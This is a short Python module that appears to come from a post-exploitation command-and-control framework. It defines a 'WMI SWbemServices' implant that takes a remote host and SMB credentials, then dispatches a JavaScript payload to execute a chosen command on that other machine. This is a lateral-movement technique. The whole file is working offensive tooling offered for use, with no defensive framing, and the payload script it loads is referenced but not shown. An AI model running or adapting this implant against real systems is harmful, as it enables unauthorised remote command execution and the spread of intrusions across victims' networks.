import core.job
import core.implant

class SWbemServicesJob(core.job.Job):
    def done(self):
        self.display()

    def display(self):
        self.shell.print_plain("PID Start Code: %s" % self.data)

class SWbemServicesImplant(core.implant.Implant):

    NAME = "WMI SWbemServices"
    DESCRIPTION = "Executes a command on another system."
    AUTHORS = ["zerosum0x0"]

    def load(self):
        self.options.register("CMD", "hostname", "command to run")
        self.options.register("RHOST", "", "name/IP of the remote")
        self.options.register("SMBUSER", "", "username for login")
        self.options.register("SMBPASS", "", "password for login")
        self.options.register("SMBDOMAIN", ".", "domain for login")

    def run(self):
        payloads = {}
        payloads["js"] = self.loader.load_script("data/implant/pivot/exec_wmi.js", self.options)

        self.dispatch(payloads, SWbemServicesJob)
